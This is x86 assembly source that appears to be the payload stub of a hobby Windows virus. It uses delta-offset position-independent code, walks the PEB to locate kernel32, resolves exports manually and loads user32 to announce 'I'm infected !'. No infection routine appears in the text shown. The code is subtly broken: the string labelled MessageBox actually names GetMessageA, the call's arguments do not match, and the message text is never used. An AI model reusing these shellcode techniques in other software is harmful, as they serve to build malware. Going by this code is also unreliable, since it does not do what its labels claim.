;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;                     _______           _     _                     ;;;;;;
;;;;;;                    (_______)         | |   (_)                    ;;;;;;
;;;;;;                         _ _____ ____ | |__  _                     ;;;;;;
;;;;;;                     _  | (____ |    \|  _ \| |                    ;;;;;;
;;;;;;                    | |_| / ___ | | | | |_) ) |                    ;;;;;;
;;;;;;                     \___/\_____|_|_|_|____/|_|                    ;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; C'est degueulasse

assume fs:nothing
	jmp		testcocacola

getFuncAddr PROC baseAddress:DWORD, funcName:DWORD
	
	LOCAL EOT:DWORD
	LOCAL EAT:DWORD
	
	;; Save register
	push		esi
	push		edi
	push		ebx
	push		ecx
	push		edx
	
	mov			esi, baseAddress
	mov			edi, [esi+3ch]			; get lfanew
	add			esi, edi				; GOTO PE header

	add			esi, 18h				; Go IMAGE_OPTIONAL_HEADER

	mov			ebx, [esi+60h]			; Get RVA du premier element du DATA DIRECTORY : IMAGE_DIRECTORY_ENTRY_EXPORT
	
	mov			edi, baseAddress
	
	add			edi, ebx				; GO IMAGE_EXPORT_DIRECTORY
	
	mov			edx, [edi+24]			; NB of Names in ENT > Export name table
	imul		edx, 4
	
	mov			esi, [edi+28]			; pointer (RVA) to AddressOfFunctions (EAT)
	add			esi, baseAddress
	mov			EAT, esi				; Save AddressOfFunctions
	
	mov			esi, [edi+36]			; pointer (RVA) to EOT
	add			esi, baseAddress
	mov			EOT, esi				; Save Address of EOT
	
	mov			esi, [edi+32]			; pointer (RVA) to AddressOfNames (ENT)
	add			esi, baseAddress		; we are in ENT

	;; Loop on Export name table
	xor			ecx, ecx

showfunction:
	mov			ebx, baseAddress		; Get BA
	add			ebx, [esi + ecx]		; Get string pointer
	add			ecx, 4
	
	push		ebx
	push		funcName
	call		str_cmp
	cmp			eax, 1
	je			found
		
	cmp			ecx, edx
	jne			showfunction
	jmp			silent_failure
	
found:
	sub			ecx, 4
	
	;; GetProcAddress
	mov			esi, EOT				; Get EOT
	shr			ecx, 1					; /2 cause of WORD alignment for EOT
	movzx		ecx, word ptr [esi+ecx]	; Get index in EAT from EOT
	imul		ecx, 4					; index * 4
	mov			esi, EAT				; Get address (NOT RVA)of EAT	
	mov			esi, [esi+ecx]			; get rva of function

	add			esi, baseAddress	
	mov			eax, esi
	
	pop			edx
	pop			ecx
	pop			ebx
	pop			edi
	pop			esi
	ret
getFuncAddr ENDP


str_cmp PROC s1:DWORD, s2:DWORD

	;; Save register
	push		esi
	push		ebx
	push		ecx
	push		edx
	
	xor			esi, esi
	
	mov			eax, s1
	mov			ebx, s2
next:
	;; Fill buffers
	xor			ecx, ecx
	xor			edx, edx
	mov			cl, byte ptr [eax+esi]
	mov			dl, byte ptr [ebx+esi]
	
	;; Inc counter
	add			esi, 1
	
	;; Escape if end or not equal
	cmp			cl, 0
	je			escape

	cmp			dl, 0
	je			escape
	
	cmp			cl, dl
	jne			escape
		
	jmp			next

escape:
	cmp			dl, cl
	jne			notfound
	
	mov			eax, 1
	jmp			recover
	
notfound:
	mov			eax, 0
	
recover:
	pop			edx
	pop			ecx
	pop			ebx
	pop			esi
    ret 
str_cmp ENDP

cocacola PROC

	LOCAL KBA:DWORD		; Kernel Base Address
	LOCAL p_GetProcAddress:DWORD	; GetProcAddress
	LOCAL p_LoadLibrary:DWORD		; LoadLibraryExA
	LOCAL p_MessageBox:DWORD		; MessageBoxA
	LOCAL hModuleUser32:DWORD		; user32 HMODULE


jmp				fname_end
	;; Files
	s_user32			db	"C:\Windows\System32\user32.dll", 0

	;; Functions
	s_GetProcAddress	db	"GetProcAddress", 0
	s_LoadLibrary		db	"LoadLibraryExA", 0
	s_MessageBox		db	"GetMessageA", 0
	
	;; Text
	s_text				db	"I'm infected !", 0
fname_end:

	call		get_delta
	get_delta:
	pop			edi
	sub			edi, offset get_delta



	mov			eax, fs:[030h]		; pointer to PEB
	mov			eax, [eax+0Ch]		; PEB->Ldr
	mov			eax, [eax+1Ch]		; PEB->Ldr.InLoadOrderModuleList.Flink 
	mov			eax, [eax]			; second entry
	mov			eax, [eax+8h]		; kernel base address

	mov			KBA, eax

	mov			bx, [eax]			; on arrive sur MZ
	cmp			bx, 5a4dh			; On verifie l entete MZ
	jne			silent_failure
	
	mov			ebx, [eax+3ch]
	
	add			eax, ebx			; on arrive sur PE

	mov			ebx, [eax]					
	cmp			ebx, 00004550h		; On verifie l entete PE
	jne			silent_failure


	lea			eax, [offset s_LoadLibrary+ edi]
	push		eax
	push		KBA
	call		getFuncAddr

	cmp			eax, 0
	je			silent_failure
	mov			p_LoadLibrary, eax

	lea			eax, [offset s_GetProcAddress+edi]
	push		eax
	push		KBA
	call		getFuncAddr

	cmp			eax, 0
	je			silent_failure
	mov			p_GetProcAddress, eax

	push		NULL
	push		NULL
	lea			eax, [offset s_user32+edi]
	push		eax
	call		p_LoadLibrary

	cmp			eax, NULL
	je			silent_failure
	mov			hModuleUser32, eax

	lea			eax, [offset s_MessageBox+edi]
	push		eax
	push		hModuleUser32
	call		p_GetProcAddress

	mov			p_MessageBox, eax
	cmp			eax, NULL
	je			silent_failure

	sub			esp, 200
	push		0
	push		0
	push		0
	lea			eax, [esp+12]
	push		eax
	call		p_MessageBox

	jmp			endofeverything
cocacola ENDP



	testcocacola:
	jmp		cocacola

endofeverything:
